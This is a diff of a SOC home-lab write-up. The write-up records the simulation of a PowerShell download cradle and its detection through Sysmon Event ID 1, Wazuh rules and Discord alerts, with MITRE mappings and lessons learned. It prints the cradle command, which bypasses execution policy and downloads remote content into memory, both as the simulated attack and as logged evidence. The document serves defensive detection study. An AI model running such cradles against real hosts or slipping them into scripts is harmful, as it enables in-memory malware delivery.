@@ -1,18 +1,29 @@
 # Incident 009 – PowerShell Download Cradle
 
-## Overview
+## Description
 
-This incident simulates a PowerShell Download Cradle technique commonly used by attackers to retrieve remote content and execute malicious payloads. The activity was executed on the WIN-LTSC1 endpoint and monitored using Sysmon, Wazuh, and Discord alerting integration.
+Simulation of a PowerShell Download Cradle technique used to retrieve remote content from an external source.
 
-The objective was to validate the detection of suspicious PowerShell activity, command-line logging, event correlation, and alert generation within the SOC Home Lab environment.
+This activity demonstrates how attackers can leverage PowerShell and .NET WebClient functionality to download content directly into memory. The event was monitored using Sysmon, Wazuh, and Discord alerting integration.
 
-## MITRE ATT&CK Mapping
+---
 
-| Tactic                            | Technique             | ID        |
-| --------------------------------- | --------------------- | --------- |
-| Execution                         | PowerShell            | T1059.001 |
-| Command and Scripting Interpreter | PowerShell            | T1059.001 |
-| Command and Control               | Ingress Tool Transfer | T1105     |
+## Skills Demonstrated
+
+- PowerShell Analysis
+- Sysmon Event Investigation
+- Wazuh Alert Analysis
+- Threat Hunting
+- Windows Endpoint Monitoring
+- MITRE ATT&CK Mapping
+- Discord Alert Validation
+
+---
+
+## Techniques
+
+- T1059.001 – PowerShell
+- T1105 – Ingress Tool Transfer
 
 ---
 
@@ -20,22 +31,22 @@ The objective was to validate the detection of suspicious PowerShell activity, c
 
 ### Endpoint
 
-* Windows 10 IoT Enterprise LTSC 2021
-* Sysmon Installed
-* Wazuh Agent Installed
+- Windows 10 IoT Enterprise LTSC 2021
+- Sysmon Installed
+- Wazuh Agent Installed
 
 ### Monitoring Stack
 
-* Wazuh Manager
-* Wazuh Dashboard
-* Sysmon
-* Discord Alert Integration
+- Wazuh Manager
+- Wazuh Dashboard
+- Sysmon
+- Discord Webhook Integration
 
 ---
 
 ## Attack Simulation
 
-The following PowerShell Download Cradle command was executed:
+The following command was executed from an elevated PowerShell session:
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadString('https://example.com')"
@@ -47,176 +58,125 @@ The command creates a .NET WebClient object and downloads remote content directl
 
 ## Evidence 01 – PowerShell Download Cradle Execution
 
-### Description
+The Download Cradle command was executed successfully from PowerShell.
 
-Execution of the Download Cradle command from an elevated PowerShell session.
-
-### Evidence
-
-File:
-
-```text
-01-powershell-download-cradle-command.png
-```
+![Evidence 01](images/01-powershell-download-cradle-command.png)
 
 ### Result
 
-The remote content from example.com was successfully retrieved and displayed in the PowerShell console.
+The remote content hosted on example.com was successfully retrieved and displayed in the PowerShell console.
 
 ---
 
 ## Evidence 02 – Sysmon Process Creation Detection
 
-### Description
+Sysmon Event ID 1 recorded the PowerShell process creation and captured the full command line.
 
-Sysmon Event ID 1 recorded the creation of the PowerShell process.
-
-### Event Details
-
-```text
-Event ID: 1
-Source: Sysmon
-Image: powershell.exe
-```
-
-### Command Line Observed
-
-```text
-powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadString('https://example.com')"
-```
-
-### Evidence
-
-File:
-
-```text
-02-sysmon-powershell-download-cradle.png
-```
+![Evidence 02](images/02-sysmon-powershell-download-cradle.png)
 
 ### Result
 
-Sysmon successfully captured the PowerShell execution and full command-line parameters.
+Sysmon successfully logged the execution of PowerShell with the DownloadString() function.
+
+Key observations:
+
+- Event ID 1 (Process Create)
+- powershell.exe execution
+- ExecutionPolicy Bypass parameter
+- DownloadString() usage
+- Full command-line visibility
 
 ---
 
 ## Evidence 03 – Wazuh Alert Detection
 
-### Description
+The Sysmon event was forwarded to Wazuh and generated an alert.
 
-The Sysmon process creation event was forwarded to Wazuh and generated an alert.
+![Evidence 03](images/03-wazuh-powershell-download-cradle-alert.png)
 
-### Wazuh Detection
+### Alert Information
 
-```text
-Rule ID: 92027
-Level: 4
-Description: Powershell process spawned powershell instance
-MITRE: T1059.001
-```
-
-### Evidence
-
-File:
-
-```text
-03-wazuh-powershell-download-cradle-alert.png
-```
+| Field | Value |
+|---------|---------|
+| Rule ID | 92027 |
+| Level | 4 |
+| Description | Powershell process spawned powershell instance |
+| MITRE ATT&CK | T1059.001 |
 
 ### Result
 
-Wazuh successfully detected suspicious PowerShell execution activity.
+Wazuh successfully detected suspicious PowerShell activity and generated an alert for investigation.
 
 ---
 
 ## Evidence 04 – Wazuh Alert Investigation
 
-### Description
+The alert details were reviewed to validate the command execution and identify the associated process information.
 
-Detailed investigation of the Wazuh alert.
+![Evidence 04](images/04-wazuh-powershell-download-cradle-details.png)
 
-### Relevant Fields
+### Key Findings
 
-```text
-Image:
-powershell.exe
-
-CommandLine:
-powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadString('https://example.com')"
-
-User:
-DOMAIN\User
-```
-
-### Evidence
-
-File:
-
-```text
-04-wazuh-powershell-download-cradle-details.png
-```
+- PowerShell execution confirmed
+- DownloadString() function observed
+- Net.WebClient usage identified
+- Full command line available for investigation
+- User context successfully recorded
 
 ### Result
 
-The alert investigation confirmed the use of a PowerShell Download Cradle to retrieve remote content.
+Alert investigation confirmed the use of a PowerShell Download Cradle technique to retrieve remote content.
 
 ---
 
 ## Evidence 05 – Discord Alert Notification
 
-### Description
+A high-severity Discord notification was generated from related suspicious activity observed during execution.
 
-A high-severity Discord notification was generated as a result of related malicious file activity detected during the PowerShell execution.
+![Evidence 05](images/05-discord-powershell-download-cradle-alert.png)
 
-### Discord Alert
+### Alert Information
 
-```text
-Rule ID: 92213
-Level: 15
-Description: Executable file dropped in folder commonly used by malware
-Windows Event ID: 11
-MITRE ATT&CK: T1105
-```
-
-### Evidence
-
-File:
-
-```text
-05-discord-powershell-download-cradle-alert.png
-```
+| Field | Value |
+|---------|---------|
+| Rule ID | 92213 |
+| Level | 15 |
+| Description | Executable file dropped in folder commonly used by malware |
+| Event ID | 11 |
 
 ### Result
 
-The Discord integration successfully delivered a high-severity notification generated by Wazuh.
+The Discord integration successfully delivered a real-time alert generated by Wazuh.
 
 ---
 
 ## Detection Summary
 
-| Component            | Result     |
-| -------------------- | ---------- |
-| PowerShell Execution | Detected   |
-| Sysmon Event ID 1    | Detected   |
-| Wazuh Alert          | Generated  |
-| Alert Investigation  | Successful |
-| Discord Notification | Generated  |
+| Detection Source | Status |
+|------------------|---------|
+| PowerShell Execution | Detected |
+| Sysmon Event ID 1 | Detected |
+| Wazuh Alert | Generated |
+| Alert Investigation | Completed |
+| Discord Notification | Generated |
 
 ---
 
 ## Security Impact
 
-PowerShell Download Cradle techniques are frequently used by attackers to retrieve payloads from remote infrastructure while minimizing disk artifacts. Monitoring PowerShell command-line activity is critical for detecting malware delivery, post-exploitation frameworks, and command-and-control operations.
+PowerShell Download Cradle techniques are frequently used by attackers to retrieve payloads, scripts, and malware from remote infrastructure while minimizing disk artifacts.
 
-The combination of Sysmon, Wazuh, and Discord alerting provides effective visibility into this attack technique.
+Monitoring PowerShell activity, command-line parameters, and related file creation events provides valuable visibility into potential malicious behavior and post-exploitation activity.
+
+The combination of Sysmon, Wazuh, and Discord alerting enables rapid detection and investigation of suspicious PowerShell execution.
 
 ---
 
 ## Lessons Learned
 
-* Sysmon Event ID 1 provides valuable visibility into PowerShell activity.
-* Command-line logging significantly improves threat hunting capabilities.
-* Wazuh successfully correlates PowerShell execution events.
-* Discord integration enables near real-time alert notification.
-* Download Cradle activity can trigger additional detections associated with malware delivery behavior.
-* PowerShell remains one of the most important attack surfaces to monitor in Windows environments.
-
+- Sysmon Event ID 1 provides detailed visibility into PowerShell activity.
+- Command-line logging significantly improves threat hunting capabilities.
+- Wazuh successfully correlates PowerShell execution events.
+- Discord integration provides near real-time alert notification.
+- Download Cradle activity can trigger additional detections associated with malware delivery behavior.
+- PowerShell remains a critical attack surface that should be continuously monitored in Windows environments.
